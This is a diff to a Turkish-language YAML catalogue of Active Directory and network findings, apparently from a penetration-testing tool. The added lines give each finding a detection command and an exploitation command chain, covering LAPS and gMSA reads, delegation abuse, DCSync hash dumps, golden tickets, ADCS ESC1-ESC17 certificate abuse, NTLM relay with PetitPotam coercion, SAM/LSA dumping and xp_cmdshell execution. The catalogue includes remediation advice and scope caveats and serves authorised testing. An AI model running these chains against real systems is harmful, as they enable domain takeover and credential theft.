@@ -632,6 +922,13 @@ laps-readable:
   description: >
     LAPS yönetilen yerel admin parolasını okuma yetkisi gereğinden geniş
     principal'lere verilmiş; yatay/dikey harekete yol açar.
+  detect_code: |
+    # ad modülü — nxc laps (okunabiliyor mu)
+    nxc ldap <dc> -u user -p pass -M laps
+  exploit_code: |
+    # Okunan LAPS parolasıyla yerel admin girişi
+    nxc smb <host> -u user -p pass -M laps        # parolayı al
+    nxc smb <host> -u Administrator -p '<laps_pass>' --local-auth -x whoami
   exploitation: "OTOMATİK — nxc/ldap ile ms-Mcs-AdmPwd okuma denemesi."
   remediation: "LAPS okuma ACL'ini yalnızca gerekli yönetici gruplarına verin; Windows LAPS'a geçin."
   references:
@@ -648,6 +945,13 @@ gmsa-readable:
   description: >
     gMSA parolasını (msDS-ManagedPassword) okuma yetkisi fazla principal'de;
     servis hesabı taklit edilebilir.
+  detect_code: |
+    # ad modülü — nxc --gmsa (okuma + NTLM türetme)
+    nxc ldap <dc> -u user -p pass --gmsa
+  exploit_code: |
+    # NT hash'i al, pass-the-hash ile servis hesabı olarak hareket et
+    python3 gMSADumper.py -u user -p pass -d lab.local
+    nxc smb <ip> -u 'gmsa$' -H <nthash>
   exploitation: "OTOMATİK — gMSADumper/nxc ile okuma; NT hash türetme."
   remediation: "PrincipalsAllowedToRetrieveManagedPassword'ı daraltın."
   references:
@@ -667,6 +971,14 @@ machineaccountquota:
   description: >
     Varsayılan MAQ=10; herhangi bir kullanıcı bilgisayar hesabı ekleyebilir.
     noPac ve RBCD saldırı zincirlerinin ön koşulu.
+  detect_code: |
+    # ad modülü — nxc maq (MachineAccountQuota değeri)
+    nxc ldap <dc> -u user -p pass -M maq
+  exploit_code: |
+    # Önkoşul; zincir noPac veya RBCD. Makine hesabı ekle:
+    impacket-addcomputer lab.local/user:pass -computer-name 'EVIL$' \
+        -computer-pass 'Pass123!' -dc-ip <dc>
+    # → RBCD veya noPac (bkz. ilgili kayıtlar)
   remediation: "ms-DS-MachineAccountQuota=0; makine ekleme yetkisini delege edin."
   references:
     - "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology"
@@ -684,6 +996,17 @@ unconstrained-delegation:
     Unconstrained delegation ayarlı host, kendisine kimlik doğrulayan her
     principal'in TGT'sini belleğinde tutar. DC'yi coerce edip TGT yakalamak
     domain ele geçirmeye götürür.
+  detect_code: |
+    # ad modülü — findDelegation (Unconstrained satırları)
+    impacket-findDelegation lab.local/user:pass -dc-ip <dc>
+  exploit_code: |
+    # YARI MANUEL — host ele geçirildiyse: TGT yakala
+    # (ele geçmiş unconstrained hostta) Rubeus:
+    Rubeus.exe monitor /interval:5 /nowrap
+    # DC'yi coerce et → DC TGT belleğe düşer:
+    python3 printerbug.py lab.local/user:pass@<dc> <unconstrained-host>
+    # Yakalanan DC TGT ile DCSync:
+    impacket-secretsdump -k -no-pass -just-dc lab.local/DC01\$@<dc>
   exploitation: >
     YARI MANUEL — host ele geçirildiyse Rubeus monitor + printerbug ile DC
     TGT yakalama; ticket kullanımı sonraki faz.
@@ -705,6 +1028,18 @@ constrained-delegation:
     Constrained delegation (özellikle protokol geçişi) veya bir bilgisayar
     nesnesinde yazılabilir RBCD özelliği, hedef servise rastgele kullanıcı
     taklidiyle erişim sağlar.
+  detect_code: |
+    # ad modülü — findDelegation (Constrained / Resource-Based satırları)
+    impacket-findDelegation lab.local/user:pass -dc-ip <dc>
+  exploit_code: |
+    # MANUEL — S4U ile hedef servise admin taklidi
+    # Constrained (protokol geçişi):
+    impacket-getST -spn cifs/<target> -impersonate administrator lab.local/svc:pass
+    # RBCD (yazılabilir msDS-AllowedToActOnBehalfOf):
+    impacket-rbcd -delegate-from 'EVIL$' -delegate-to '<target>$' -action write lab.local/user:pass
+    impacket-getST -spn cifs/<target> -impersonate administrator 'lab.local/EVIL$:Pass123!'
+    export KRB5CCNAME=administrator.ccache
+    nxc smb <target> --use-kcache -x whoami
   exploitation: >
     YARI MANUEL — S4U (Rubeus/getST.py) ile hedef CIFS/HOST bileti üretme;
     ticket kullanımı sonraki faz.
@@ -724,6 +1059,15 @@ dcsync-rights:
   description: >
     DS-Replication-Get-Changes(-All) hakkına sahip ayrıcalıksız bir hesap,
     DC gibi davranıp krbtgt dahil tüm parola hash'lerini çekebilir.
+  detect_code: |
+    # bloodhound modülü — grafikte DCSync/GetChanges hakkı tespit edilir
+    # (manuel teyit) nxc ile:
+    nxc ldap <dc> -u user -p pass -M daclread -o TARGET_DN='DC=lab,DC=local' ACTION=read
+  exploit_code: |
+    # MANUEL (yüksek etki, opt-in) — tüm hash'leri çek
+    impacket-secretsdump lab.local/user:pass@<dc> -just-dc
+    # Yalnız krbtgt (golden ticket için):
+    impacket-secretsdump lab.local/user:pass@<dc> -just-dc-user krbtgt
   exploitation: >
     MANUEL (dump) — secretsdump.py -just-dc / nxc --ntds. Yüksek etki;
     yalnızca kapsam açıkça izin veriyorsa ve opt-in bayrağıyla.
@@ -746,6 +1090,19 @@ acl-abuse:
     GenericAll/GenericWrite/WriteDACL/WriteOwner/ForceChangePassword/AddMember
     gibi haklar; kullanıcı/grup/bilgisayar/GPO/OU üzerinde yanlış atanmışsa
     yetki yükseltme yolu açar (ör. hedef kullanıcının parolasını sıfırlama).
+  detect_code: |
+    # bloodhound modülü — toplanan ACE'lerden tehlikeli haklar çıkarılır
+    # (manuel teyit) bloodyAD veya nxc:
+    bloodyAD -u user -p pass -d lab.local --host <dc> get writable
+  exploit_code: |
+    # MANUEL — hakka göre:
+    # GenericAll/ForceChangePassword (kullanıcı): parola sıfırla
+    bloodyAD -u user -p pass -d lab.local --host <dc> set password <target> 'NewPass123!'
+    # GenericAll (grup): üye ekle
+    bloodyAD -u user -p pass -d lab.local --host <dc> add groupMember '<group>' <user>
+    # WriteDACL: kendine DCSync ver
+    impacket-dacledit -action write -rights DCSync -principal user -target-dn 'DC=lab,DC=local' lab.local/user:pass
+    # GenericWrite (kullanıcı): targetedKerberoast veya Shadow Cred
   exploitation: >
     YARI MANUEL — BloodHound yol analizi; GenericAll ile net rpc password /
     targetedKerberoast; yürütme kararı operatöre ait.
@@ -764,6 +1121,15 @@ shadow-credentials:
   description: >
     Hedef nesnenin msDS-KeyCredentialLink özelliğine yazabilen principal,
     kendi anahtarını ekleyip PKINIT ile o nesne olarak kimlik doğrular.
+  detect_code: |
+    # bloodhound modülü — KeyCredentialLink yazma hakkı tespit edilir
+    # (manuel teyit) certipy:
+    certipy-ad find -u user@lab.local -p pass -dc-ip <dc> -vulnerable -stdout
+  exploit_code: |
+    # YARI MANUEL — anahtar ekle + PKINIT ile TGT al
+    certipy-ad shadow auto -u user@lab.local -p pass -account <target> -dc-ip <dc>
+    # → NT hash + TGT döner; pass-the-hash:
+    nxc smb <ip> -u <target> -H <nthash>
   exploitation: >
     YARI MANUEL — certipy shadow auto / Whisker; anahtar ekleme ve TGT alma
     operatör kararı.
@@ -784,6 +1150,14 @@ adcs-esc1:
     Client Authentication + enrollee supplies subject + Domain Users enroll
     hakkı olan şablonda, düşük yetkili kullanıcı SAN'a Domain Admin yazıp o
     kullanıcı olarak kimlik doğrulayan sertifika alır.
+  detect_code: |
+    # ad modülü — certipy find -vulnerable (ESC1 işareti)
+    certipy-ad find -vulnerable -stdout -u user@lab.local -p pass -dc-ip <dc> -ns <dc>
+  exploit_code: |
+    # MANUEL — SAN'a administrator yazarak sertifika al, sonra auth
+    certipy-ad req -u user@lab.local -p pass -dc-ip <dc> \
+        -ca <CA-NAME> -template <VulnTemplate> -upn administrator@lab.local
+    certipy-ad auth -pfx administrator.pfx -dc-ip <dc>   # → TGT + NT hash
   exploitation: >
     MANUEL — certipy req ... -upn administrator; alınan pfx ile PKINIT/TGT.
     Şablon seçimi ve talep zinciri operatör kararı (yanlış şablon iz bırakır).
@@ -804,6 +1178,18 @@ adcs-esc8:
   description: >
     CA web enrollment (certsrv) HTTP üzerinde NTLM kabul ediyor. Coercion ile
     DC auth'u certsrv'e relay edilip DC için sertifika alınır → domain ele geçirme.
+  detect_code: |
+    # ad modülü — certipy find (ESC8 / web enrollment açık)
+    certipy-ad find -vulnerable -stdout -u user@lab.local -p pass -dc-ip <dc> -ns <dc>
+  exploit_code: |
+    # MANUEL — coercion + relay (iki terminal)
+    # T1:
+    impacket-ntlmrelayx -t http://<ca>/certsrv/certfnsh.asp \
+        -smb2support --adcs --template DomainController
+    # T2:
+    python3 PetitPotam.py -u user -p pass <attacker> <dc>
+    # Dönen base64 sertifika → pfx, sonra:
+    certipy-ad auth -pfx dc.pfx -dc-ip <dc>
   exploitation: >
     MANUEL (yarı) — araç ESC8 yüzeyini + coercion hedefini hazırlar; PetitPotam
     + ntlmrelayx --target http://CA/certsrv zinciri operatör kontrolünde.
@@ -825,6 +1211,13 @@ ldap-anonymous-bind:
   tags: [ldap, enum]
   summary: "Kimlik doğrulamasız LDAP ile bilgi sızıntısı."
   description: "Anonim/Pre-Windows 2000 bind ile dizin bilgisi okunabilir."
+  detect_code: |
+    # services modülü — anonim bind ile kullanıcı numaralandırma
+    nxc ldap <ip> -u '' -p '' --users
+  exploit_code: |
+    # Bilgi toplama (sömürü değil)
+    ldapsearch -x -H ldap://<ip> -b "DC=lab,DC=local" "(objectClass=user)"
+    nxc ldap <ip> -u '' -p '' --users --groups
   remediation: "Anonim bind'i kapatın; LDAP signing + channel binding zorunlu."
   references:
     - "https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap"
@@ -840,6 +1233,14 @@ snmp-default-community:
   description: >
     SNMP v1/v2c'de public/private community ile sistem bilgisi, ARP/route,
     bazen yazma (config değişikliği) mümkün.
+  detect_code: |
+    # services modülü — onesixtyone ile community brute (public/private)
+    onesixtyone -c /usr/share/doc/onesixtyone/dict.txt -i hosts.txt
+  exploit_code: |
+    # Enum (okuma); yazma MANUEL
+    snmpwalk -v2c -c public <ip>
+    snmp-check <ip> -c public
+    # Yazma (varsa): snmpset -v2c -c private <ip> <OID> ...
   exploitation: "OTOMATİK tespit (onesixtyone); snmpwalk ile enum. Yazma MANUEL."
   remediation: "Community'leri değiştirin; SNMPv3 (auth+priv); erişimi kısıtlayın."
   references:
@@ -855,6 +1256,16 @@ heartbleed:
   tags: [tls]
   summary: "OpenSSL bellek sızıntısı — anahtar/oturum sızması."
   description: "OpenSSL TLS heartbeat'te sınır dışı okuma; bellekten anahtar/oturum sızar."
+  detect_code: |
+    # nmap NSE ile tespit
+    nmap -p443 --script ssl-heartbleed <ip>
+  exploit_code: |
+    # MANUEL — bellek çekme
+    msfconsole -q
+    use auxiliary/scanner/ssl/openssl_heartbleed
+    set RHOSTS <ip>
+    set VERBOSE true
+    run
   exploitation: "OTOMATİK tespit (ssl-heartbleed NSE). Bellek çekme MANUEL."
   remediation: "OpenSSL'i yükseltin; etkilenen anahtarları/sertifikaları yenileyin."
   references:
@@ -871,12 +1282,20 @@ weak-tls:
   description: >
     Zayıf şifre takımları (POODLE/DROWN), süresi dolmuş veya self-signed
     sertifikalar; MITM ve güven sorunları.
+  detect_code: |
+    # TLS denetimi
+    testssl.sh <host>:443
+    nmap -p443 --script ssl-enum-ciphers <ip>
+  exploit_code: |
+    # MITM bağlamında değerlendirilir (doğrudan exploit yok)
+    # Zayıf cipher/expired cert → kurumsal MITM senaryosu (ör. ARP + sslsplit)
   remediation: "TLS1.2+ zorunlu, güçlü şifre takımları, geçerli CA sertifikaları."
   references:
     - "https://github.com/drwetter/testssl.sh"
 
 # ─────────────────────────────────────────────────────────────
 # ADCS ESC2–ESC16 (certipy find -vulnerable ile tespit; sömürü MANUEL)
+# Hepsinin detect_code'u aynı tarama: certipy find -vulnerable
 # ─────────────────────────────────────────────────────────────
 adcs-esc2:
   title: "ADCS ESC2 (Any Purpose / EKU yok şablon)"
@@ -889,6 +1308,12 @@ adcs-esc2:
   description: >
     Şablonun EKU'su 'Any Purpose' veya hiç EKU yok; düşük yetkili enroll hakkıyla
     alınan sertifika kimlik doğrulama dahil her amaçla kullanılabilir.
+  detect_code: |
+    certipy-ad find -vulnerable -stdout -u user@lab.local -p pass -dc-ip <dc> -ns <dc>
+  exploit_code: |
+    # MANUEL — sertifika al, kimlik için kullan
+    certipy-ad req -u user@lab.local -p pass -ca <CA> -template <AnyPurposeTmpl>
+    certipy-ad auth -pfx user.pfx -dc-ip <dc>
   exploitation: "MANUEL — certipy req ile sertifika alınır, PKINIT/kimlik için kullanılır."
   remediation: "EKU'yu daraltın; enroll yetkisini ve 'supplies subject'i kısıtlayın."
   references:
@@ -905,6 +1330,14 @@ adcs-esc3:
   description: >
     Enrollment Agent (Certificate Request Agent EKU) şablonuna erişim, saldırganın
     başka kullanıcılar adına (ör. Domain Admin) sertifika talep etmesine izin verir.
+  detect_code: |
+    certipy-ad find -vulnerable -stdout -u user@lab.local -p pass -dc-ip <dc> -ns <dc>
+  exploit_code: |
+    # MANUEL — önce agent sertifikası, sonra DA adına talep
+    certipy-ad req -u user@lab.local -p pass -ca <CA> -template <EnrollAgentTmpl>
+    certipy-ad req -u user@lab.local -p pass -ca <CA> -template User \
+        -on-behalf-of 'lab.local\administrator' -pfx agent.pfx
+    certipy-ad auth -pfx administrator.pfx -dc-ip <dc>
   exploitation: "MANUEL — certipy req -on-behalf-of ile hedef kullanıcı sertifikası."
   remediation: "Enrollment Agent şablonlarını ve enroll haklarını kısıtlayın; manager approval."
   references:
@@ -922,6 +1355,14 @@ adcs-esc4:
     Düşük yetkili principal bir sertifika şablonu üzerinde yazma hakkına sahip;
     şablonu 'enrollee supplies subject' + client auth olacak şekilde değiştirip
     (ESC1) domain yetki yükseltir.
+  detect_code: |
+    certipy-ad find -vulnerable -stdout -u user@lab.local -p pass -dc-ip <dc> -ns <dc>
+  exploit_code: |
+    # MANUEL — şablonu zafiyetli yap (ESC1), sömür, sonra ESKİ HALE GETİR
+    certipy-ad template -u user@lab.local -p pass -template <Tmpl> \
+        -write-default-configuration -dc-ip <dc>
+    certipy-ad req -u user@lab.local -p pass -ca <CA> -template <Tmpl> -upn administrator@lab.local
+    # Geri al: -configuration <backup.json>
   exploitation: "MANUEL — certipy template ile şablonu zafiyetli yap, sonra ESC1 zinciri."
   remediation: "Şablon ACL'lerini sıkılaştırın (yalnız yetkili yöneticiler Write)."
   references:
@@ -938,6 +1379,13 @@ adcs-esc5:
   description: >
     CA bilgisayar hesabı veya PKI ile ilgili AD nesneleri (Enrollment Services,
     NtAuthCertificates) üzerindeki aşırı haklar CA'yı veya güveni ele geçirmeye yol açar.
+  detect_code: |
+    certipy-ad find -vulnerable -stdout -u user@lab.local -p pass -dc-ip <dc> -ns <dc>
+    # PKI nesne ACL'leri için BloodHound/dacledit ile de incelenir
+  exploit_code: |
+    # MANUEL — PKI nesnesi üzerinde ACL suistimali (ör. CA host nesnesi)
+    # Örn. CA bilgisayar nesnesine WriteDACL → RBCD/shadow ile CA host ele geçir
+    certipy-ad find -stdout ...   # NtAuth/Enrollment Services sahipliğini doğrula
   exploitation: "MANUEL — ACL suistimali ile CA/PKI nesnesi ele geçirilir."
   remediation: "PKI AD nesnelerinin sahiplik/ACL'lerini Tier-0'a kısıtlayın."
   references:
@@ -954,6 +1402,13 @@ adcs-esc6:
   description: >
     CA'da EDITF_ATTRIBUTESUBJECTALTNAME2 etkin; herhangi bir şablonla yapılan talepte
     saldırgan SAN'a istediği UPN'i (ör. Administrator) ekleyip o kullanıcı olur.
+  detect_code: |
+    certipy-ad find -vulnerable -stdout -u user@lab.local -p pass -dc-ip <dc> -ns <dc>
+  exploit_code: |
+    # MANUEL — herhangi bir client-auth şablonu + SAN enjeksiyonu
+    certipy-ad req -u user@lab.local -p pass -ca <CA> -template User \
+        -upn administrator@lab.local
+    certipy-ad auth -pfx administrator.pfx -dc-ip <dc>
   exploitation: "MANUEL — certipy req -upn administrator ile; CA bayrağı aktifken."
   remediation: "CA'da EDITF_ATTRIBUTESUBJECTALTNAME2 bayrağını kaldırıp CA'yı yeniden başlatın."
   references:
@@ -970,6 +1425,14 @@ adcs-esc7:
   description: >
     ManageCA/ManageCertificates hakkı olan principal, CA'da ESC6 bayrağını açabilir
     veya bekleyen sertifika taleplerini onaylayarak yetki yükseltir.
+  detect_code: |
+    certipy-ad find -vulnerable -stdout -u user@lab.local -p pass -dc-ip <dc> -ns <dc>
+  exploit_code: |
+    # MANUEL — ManageCA ile kendini officer yap + SAN bayrağını aç veya talebi onayla
+    certipy-ad ca -u user@lab.local -p pass -ca <CA> -add-officer user -dc-ip <dc>
+    certipy-ad ca -u user@lab.local -p pass -ca <CA> -enable-template SubCA
+    # beklemede talebi onayla:
+    certipy-ad ca -u user@lab.local -p pass -ca <CA> -issue-request <ReqID>
   exploitation: "MANUEL — certipy ca ile flag değiştir / talep onayla."
   remediation: "CA yönetim rollerini (ManageCA/ManageCertificates) sıkı kısıtlayın."
   references:
@@ -986,6 +1449,14 @@ adcs-esc9:
   description: >
     Şablonda security extension (SID bağlama) yoksa ve hesap eşlemesi zayıfsa,
     altUPN manipülasyonuyla başka kullanıcı taklit edilebilir.
+  detect_code: |
+    certipy-ad find -vulnerable -stdout -u user@lab.local -p pass -dc-ip <dc> -ns <dc>
+  exploit_code: |
+    # MANUEL — hedefin UPN'ini değiştir, sertifika al, geri al
+    certipy-ad account update -u user@lab.local -p pass -user <victim> -upn administrator
+    certipy-ad req -u <victim>@lab.local -p pass -ca <CA> -template <Tmpl>
+    certipy-ad account update -u user@lab.local -p pass -user <victim> -upn <victim>@lab.local
+    certipy-ad auth -pfx administrator.pfx -dc-ip <dc>
   exploitation: "MANUEL — certipy ile UPN değiştirip hedef kullanıcı sertifikası alınır."
   remediation: "StrongCertificateBindingEnforcement=2; security extension zorunlu."
   references:
@@ -1002,6 +1473,12 @@ adcs-esc10:
   description: >
     DC'de zayıf sertifika eşleme ayarları (CertificateMappingMethods=0x4 veya
     StrongCertificateBindingEnforcement=0) UPN tabanlı taklide izin verir.
+  detect_code: |
+    certipy-ad find -vulnerable -stdout -u user@lab.local -p pass -dc-ip <dc> -ns <dc>
+  exploit_code: |
+    # MANUEL — ESC9 benzeri UPN manipülasyonu veya Shadow Cred + zayıf eşleme
+    certipy-ad account update -u user@lab.local -p pass -user <victim> -upn administrator
+    certipy-ad shadow auto -u <victim>@lab.local -p pass -account <victim>
   exploitation: "MANUEL — Shadow Credentials/UPN ile hedef kullanıcı kimliği."
   remediation: "Güçlü binding (SID) zorunlu; zayıf eşleme registry ayarlarını düzeltin."
   references:
@@ -1018,6 +1495,14 @@ adcs-esc11:
   description: >
     CA'da IF_ENFORCEENCRYPTICERTREQUEST ayarlı değilse, RPC (ICPR) enrollment'a
     coercion ile yakalanan NTLM relay edilerek sertifika alınabilir.
+  detect_code: |
+    certipy-ad find -vulnerable -stdout -u user@lab.local -p pass -dc-ip <dc> -ns <dc>
+  exploit_code: |
+    # MANUEL — coercion + RPC (ICPR) relay
+    # T1 (ntlmrelayx ESC11 fork / -t rpc://<ca>):
+    impacket-ntlmrelayx -t rpc://<ca> -rpc-mode ICPR -icpr-ca-name <CA> -smb2support
+    # T2: coercion
+    python3 PetitPotam.py -u user -p pass <attacker> <dc>
   exploitation: "MANUEL (yarı) — coercion + ntlmrelayx ICPR; relay zinciri operatör kontrolünde."
   remediation: "RPC enrollment'ta şifrelemeyi zorunlu kılın; EPA; gereksiz enrollment kapat."
   references:
@@ -1034,6 +1519,15 @@ adcs-esc12:
   description: >
     CA sunucusuna shell erişimi ve YubiHSM üzerindeki anahtarın kullanılabilmesi,
     saldırganın keyfi sertifika (hatta Golden Certificate) üretmesine yol açar.
+  detect_code: |
+    # Araç uzaktan tespit etmez; CA host erişimi + HSM yapılandırması (manuel)
+    # certipy find çıktısında CA host/anahtar bilgisi referans alınır
+    certipy-ad find -stdout -u user@lab.local -p pass -dc-ip <dc> -ns <dc>
+  exploit_code: |
+    # MANUEL — CA host'ta (shell varsa): CA özel anahtarını çıkar → Golden Cert
+    certipy-ad ca -backup -ca <CA>          # CA sertifika+anahtar yedeği
+    certipy-ad forge -ca-pfx ca.pfx -upn administrator@lab.local -subject 'CN=Administrator'
+    certipy-ad auth -pfx administrator_forged.pfx -dc-ip <dc>
   exploitation: "MANUEL — CA host erişimi + anahtar kullanımı; yüksek etki."
   remediation: "CA host erişimini Tier-0 ile sınırlayın; HSM PIN/erişim kontrolü."
   references:
@@ -1050,6 +1544,12 @@ adcs-esc13:
   description: >
     Enroll edilebilen bir şablonun issuance policy'si ayrıcalıklı bir gruba (OID
     group link) bağlıysa, alınan sertifika o grubun üyeliğini sağlar.
+  detect_code: |
+    certipy-ad find -vulnerable -stdout -u user@lab.local -p pass -dc-ip <dc> -ns <dc>
+  exploit_code: |
+    # MANUEL — şablonu enroll et; sertifika ayrıcalıklı grup üyeliği verir
+    certipy-ad req -u user@lab.local -p pass -ca <CA> -template <OIDLinkedTmpl>
+    certipy-ad auth -pfx user.pfx -dc-ip <dc>   # token'da grup üyeliği
   exploitation: "MANUEL — certipy ile şablonu enroll et, sertifikayla ayrıcalık kazan."
   remediation: "Issuance policy–grup bağlarını denetleyin; gereksizleri kaldırın."
   references:
@@ -1066,6 +1566,14 @@ adcs-esc14:
   description: >
     Hedef hesabın altSecurityIdentities özelliğine yazabilen principal, kendi
     sertifikasını o hesaba eşleyerek kimliğini taklit eder.
+  detect_code: |
+    certipy-ad find -vulnerable -stdout -u user@lab.local -p pass -dc-ip <dc> -ns <dc>
+    # altSecurityIdentities yazma hakkı BloodHound/dacledit ile de doğrulanır
+  exploit_code: |
+    # MANUEL — hedefe explicit mapping yaz, kendi sertifikanla taklit et
+    bloodyAD -u user -p pass -d lab.local --host <dc> \
+        set object <victim> altSecurityIdentities -v 'X509:<I>...<S>...'
+    certipy-ad auth -pfx mycert.pfx -username <victim> -domain lab.local -dc-ip <dc>
   exploitation: "MANUEL — altSecurityIdentities'e explicit mapping yaz, PKINIT ile taklit."
   remediation: "altSecurityIdentities yazma ACL'lerini kısıtlayın; güçlü eşleme."
   references:
@@ -1083,6 +1591,13 @@ adcs-esc15:
   description: >
     Schema V1 şablonlarda 'enrollee supplies subject' ile talepte keyfi application
     policy (ör. Client Authentication) enjekte edilerek kimlik doğrulayan sertifika alınır.
+  detect_code: |
+    certipy-ad find -vulnerable -stdout -u user@lab.local -p pass -dc-ip <dc> -ns <dc>
+  exploit_code: |
+    # MANUEL — application policy enjekte ederek client-auth sertifikası
+    certipy-ad req -u user@lab.local -p pass -ca <CA> -template <V1Tmpl> \
+        -application-policies 'Client Authentication' -upn administrator@lab.local
+    certipy-ad auth -pfx administrator.pfx -dc-ip <dc>
   exploitation: "MANUEL — certipy req ile application policy enjekte ederek sertifika."
   remediation: "KB5049983+ yamalarını uygulayın; V1 şablonları sıkılaştırın/kaldırın."
   references:
@@ -1099,6 +1614,13 @@ adcs-esc16:
   description: >
     CA, szOID_NTDS_CA_SECURITY_EXT'i devre dışı listesine aldığından tüm
     sertifikalarda SID bağlama yok; zayıf eşlemeyle domain genelinde taklit mümkün.
+  detect_code: |
+    certipy-ad find -vulnerable -stdout -u user@lab.local -p pass -dc-ip <dc> -ns <dc>
+  exploit_code: |
+    # MANUEL — ESC9/ESC10 gibi UPN manipülasyonu (CA genelinde geçerli)
+    certipy-ad account update -u user@lab.local -p pass -user <victim> -upn administrator
+    certipy-ad req -u <victim>@lab.local -p pass -ca <CA> -template User
+    certipy-ad auth -pfx administrator.pfx -dc-ip <dc>
   exploitation: "MANUEL — UPN manipülasyonu + zayıf eşleme ile hedef kullanıcı."
   remediation: "CA'da security extension devre dışı bırakmayı kaldırın; güçlü binding."
   references:
@@ -1117,6 +1639,13 @@ adcs-esc17:
     düşük yetkili bir kullanıcının WSUS/iç sunucu gibi herhangi bir hostname için
     geçerli TLS sertifikası almasına izin verir; bu sertifikayla HTTPS koruması
     aşılıp MITM (ör. WSUS üzerinden kod dağıtımı) yapılabilir. (Digitrace: A. Neff & P. Knüfer)
+  detect_code: |
+    certipy-ad find -vulnerable -stdout -u user@lab.local -p pass -dc-ip <dc> -ns <dc>
+  exploit_code: |
+    # MANUEL — hedef hostname (SAN) için TLS sertifikası al, HTTPS/WSUS MITM
+    certipy-ad req -u user@lab.local -p pass -ca <CA> -template <ServerAuthTmpl> \
+        -subject 'CN=wsus.lab.local' -dns wsus.lab.local
+    # → sertifikayla WSUS/iç sunucu adına TLS MITM (ARP/DNS yönlendirme + proxy)
   exploitation: >
     MANUEL — certipy req ile hedef hostname (SAN) için sertifika alınır; HTTPS/WSUS
     MITM operatör kararı ve koordinasyonuyla.
@@ -1141,6 +1670,19 @@ attack-path:
     Administrators, DC, domain) ulaşan kenar zinciri bulundu. Her kenar
     suistimal edilebilir bir hak (GenericAll, MemberOf, DCSync, WriteDacl,
     ForceChangePassword vb.). Zincirin tamamlanması domain ele geçirmedir.
+  detect_code: |
+    # bloodhound modülü — veri topla + grafikte BFS ile yol bul
+    bloodhound-python -c DCOnly -u user -p pass -d lab.local -ns <dc> --dns-tcp
+    # (yanal yollar için) -c All ; sonra araç BFS ile düşük→yüksek yol çıkarır
+  exploit_code: |
+    # MANUEL — zincirin HER adımı sırayla (örnek tipik zincir):
+    # 1) GenericAll → hedef parola sıfırla / Shadow Cred
+    certipy-ad shadow auto -u user@lab.local -p pass -account <target>
+    # 2) hedef kimliğiyle DCSync hakkı varsa:
+    impacket-secretsdump lab.local/<target>:<pass>@<dc> -just-dc-user krbtgt
+    # 3) Golden Ticket:
+    impacket-ticketer -nthash <krbtgt_hash> -domain-sid <sid> -domain lab.local administrator
+    # BloodHound GUI'de yolu görselleştirip doğrula (en kısa yol).
   exploitation: >
     MANUEL — yolun her adımı sırayla suistimal edilir (ör. GenericAll →
     hedef parolasını sıfırla / Shadow Cred ekle; DCSync → secretsdump → krbtgt
@@ -1166,6 +1708,15 @@ local-admin:
     Spray/roast/relay/paylaşımdan elde edilen (veya verilen) kimlik bilgisi,
     birden çok makinede yerel admin yetkisine sahip. Bu yatay hareket ve
     kimlik bilgisi/secret toplama (LSASS/SAM) imkânı demektir.
+  detect_code: |
+    # postcred modülü — nxc smb auth (Pwn3d! = yerel admin)
+    nxc smb <hosts> -u user -p pass
+  exploit_code: |
+    # MANUEL (opt-in) — komut yürütme + secret toplama
+    nxc smb <ip> -u user -p pass -x "whoami /all"
+    impacket-wmiexec lab.local/user:pass@<ip>
+    nxc smb <ip> -u user -p pass --sam --lsa          # yerel secret
+    # (DA ise) --ntds ile domain hash'leri
   exploitation: >
     MANUEL — nxc ile Pwn3d! işaretli hostlarda komut yürütme (wmiexec/psexec),
     secretsdump (LSASS/SAM) yalnız kapsam izin veriyorsa ve opt-in.
@@ -1174,44 +1725,6 @@ local-admin:
     ayırın, yeniden-kullanılan parolaları engelleyin.
   references:
     - "https://book.hacktricks.xyz/windows-hardening/ntlm"
-
-password-spray:
-  title: "Password spray yüzeyi (lockout-aware)"
-  severity: medium
-  category: config
-  phase: kerberos
-  manual_only: true
-  tags: [spray, kerberos]
-  summary: "Numaralandırılan kullanıcılar + lockout politikası → kontrollü spray yüzeyi."
-  description: >
-    Domain kullanıcıları numaralandırıldı ve parola politikası okundu. Spray
-    için güvenli deneme bütçesi hesaplanabilir; ama parola/kural seçimi ve
-    zamanlama yargı gerektirir.
-  exploitation: >
-    KESİNLİKLE MANUEL ve lockout-aware — eşik okunmadan asla denenmez. Operatör
-    tek parola/pencere ile sınırlı dener (nxc --continue-on-success YOK, throttle).
-  remediation: "Güçlü parola politikası, makul lockout, sık parolaları yasakla, MFA."
-  references:
-    - "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/password-spraying"
-
-dns-zone-transfer:
-  title: "DNS zone transfer (AXFR) açık"
-  severity: medium
-  category: config
-  phase: services
-  manual_only: false
-  tags: [dns, enum]
-  summary: "DNS sunucusu AXFR'a izin veriyor → tüm zone kayıtları (iç ağ haritası)."
-  description: >
-    DNS sunucusu kimlik doğrulamasız zone transfer'a (AXFR) izin veriyor;
-    tüm A/CNAME/SRV kayıtları çekilerek iç ağ, host adları ve servisler
-    (DC, SQL, mail) haritalanır.
-  exploitation: "OTOMATİK enum (dig axfr). Bilgi toplama — doğrudan erişim değil."
-  remediation: >
-    Zone transfer'ı yalnız yetkili ikincil DNS sunucularına kısıtlayın;
-    AD-entegre DNS'te 'yalnız güvenli' transfer.
-  references:
-    - "https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns"
 
 mssql-access:
   title: "MSSQL erişimi (kimlikli/zayıf)"
@@ -1225,6 +1738,16 @@ mssql-access:
     Elde edilen domain kimliği veya zayıf/varsayılan hesapla MSSQL'e erişim.
     sysadmin ise xp_cmdshell ile komut yürütme; linked-server zincirleriyle
     başka SQL sunuculara ve yanal harekete yol açar.
+  detect_code: |
+    # services modülü — nxc mssql ([+] erişim, (Pwn3d!) sysadmin)
+    nxc mssql <ip> -u user -p pass
+  exploit_code: |
+    # MANUEL — bağlan; sysadmin'de komut yürütme / linked-server
+    impacket-mssqlclient lab.local/user:pass@<ip> -windows-auth
+    # SQL> enable_xp_cmdshell
+    # SQL> xp_cmdshell whoami
+    # SQL> enum_links            # linked-server zinciri
+    # SQL> EXEC ('xp_cmdshell ''whoami''') AT [LINKED\SRV]
   exploitation: >
     MANUEL — mssqlclient ile bağlan; sysadmin'de xp_cmdshell/komut yürütme,
     linked-server zinciri (EXECUTE AS). Komut yürütme opt-in + yetki gerektirir.
